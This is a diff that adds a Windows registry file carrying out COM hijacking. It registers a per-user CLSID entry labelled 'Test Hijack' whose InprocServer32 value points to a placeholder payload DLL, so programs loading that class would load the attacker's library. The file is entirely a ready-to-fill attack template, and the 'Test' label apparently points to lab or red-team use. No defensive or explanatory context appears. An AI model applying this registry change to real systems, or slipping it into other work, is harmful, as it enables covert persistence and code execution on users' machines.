@@ -1,0 +1,8 @@
+Windows Registry Editor Version 5.00
+
+[HKEY_CURRENT_USER\Software\Classes\CLSID\{72C24DD5-D70A-438B-8A42-98424B88AFB8}]
+@="Test Hijack"
+
+[HKEY_CURRENT_USER\Software\Classes\CLSID\{72C24DD5-D70A-438B-8A42-98424B88AFB8}\InprocServer32]
+@="C:\\Path\\To\\Your\\Payload.dll"
+"ThreadingModel"="Apartment"
